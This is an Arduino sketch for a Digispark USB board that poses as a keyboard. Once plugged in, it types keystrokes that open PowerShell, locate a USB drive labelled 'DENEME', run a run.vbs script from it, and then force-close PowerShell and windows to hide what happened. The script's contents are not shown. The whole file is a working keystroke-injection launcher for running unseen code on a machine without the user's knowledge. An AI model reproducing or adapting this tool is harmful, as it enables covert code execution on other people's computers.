#include "DigiKeyboard.h"

void setup() {
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(300);

  // Open Powershell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Find and check usb
  DigiKeyboard.print("$usbDrive = (Get-WmiObject Win32_LogicalDisk | Where-Object { $_.VolumeName -eq 'DENEME' } | Select-Object -First 1).DeviceID; if ($usbDrive) { cd $usbDrive; } else { echo 'USB sürücüsü bulunamadı.' }");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

  //run the run.vbs file
  DigiKeyboard.print(".\\run.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

  //close powershell and explorer
  DigiKeyboard.print("Get-Process powershell | Stop-Process -Force"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);  
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(300);
  digitalWrite(1, LOW);




  // close all powershell and explorer
  //DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  //DigiKeyboard.delay(500);
  //DigiKeyboard.print("powershell");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(1500);
  //DigiKeyboard.print("Get-Process powershell | Stop-Process -Force"); 
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(300);  
  //DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  //DigiKeyboard.delay(300);
  //DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  //DigiKeyboard.delay(1000);

}

void loop() {
  // Loop içinde bir işlem yapmıyoruz
}




